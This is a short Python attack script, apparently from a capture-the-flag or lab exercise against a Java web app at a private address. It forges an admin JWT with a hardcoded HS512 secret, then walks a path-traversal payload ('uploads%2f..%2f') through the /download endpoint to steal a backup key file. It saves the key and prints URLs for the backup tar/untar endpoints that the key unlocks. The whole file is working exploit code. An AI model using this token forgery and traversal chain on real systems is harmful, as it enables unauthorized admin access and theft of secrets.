#!/usr/bin/env python3
"""
获取BackUp key文件
根据BackUpServlet.class代码，key文件在parentDir/ﾎﾝ.key
"""

import requests
import jwt
from datetime import datetime, timedelta, timezone

BASE_URL = "http://192.168.18.25:25004"
JWT_SECRET = "secret-secret-secret-secret-secret-secret-secret-secret-secret-secret-secret"

def create_admin_session():
    """创建admin session"""
    payload = {
        "sub": "admin",
        "exp": datetime.now(timezone.utc) + timedelta(minutes=30)
    }
    
    token = jwt.encode(payload, JWT_SECRET, algorithm="HS512")
    session = requests.Session()
    session.cookies.set("jwt", token)
    return session

def try_read_key():
    session = create_admin_session()
    
    # 根据BackUpServlet代码:
    # String appRoot = this.getServletContext().getRealPath("/");
    # File appDir = new File(appRoot);
    # String parentDir = appDir.getParent();
    # String key = new String(Files.readAllBytes(Paths.get(parentDir, "ﾎﾝ.key")));
    
    # 应用根目录的父目录下的ﾎﾝ.key文件
    paths_to_try = [
        "../ﾎﾝ.key",
        "../../ﾎﾝ.key", 
        "../../../ﾎﾝ.key",
        "ﾎﾝ.key",
    ]
    
    for path in paths_to_try:
        encoded_path = path.replace('/', '%2f')
        url = f"{BASE_URL}/download?path=uploads%2f..%2f{encoded_path}"
        
        print(f"[*] 尝试: {path}")
        print(f"    URL: {url}")
        
        r = session.get(url)
        print(f"    状态: {r.status_code}")
        
        if r.status_code == 200:
            print(f"[+] 成功读取key文件!")
            print(f"[+] Key内容: {r.text}")
            print(f"[+] Key长度: {len(r.text)} bytes")
            
            # 保存key
            with open("backup.key", 'w') as f:
                f.write(r.text)
            print(f"[+] 已保存到 backup.key")
            return r.text
        else:
            if r.status_code != 404:
                print(f"    响应: {r.text[:200]}")
        print()
    
    print("[!] 未能找到key文件")
    return None

if __name__ == "__main__":
    key = try_read_key()
    
    if key:
        print("\n[*] 现在可以使用BackUpServlet了!")
        print(f"[*] 访问: {BASE_URL}/backup/tar?key={key}")
        print(f"[*] 访问: {BASE_URL}/backup/untar?key={key}")
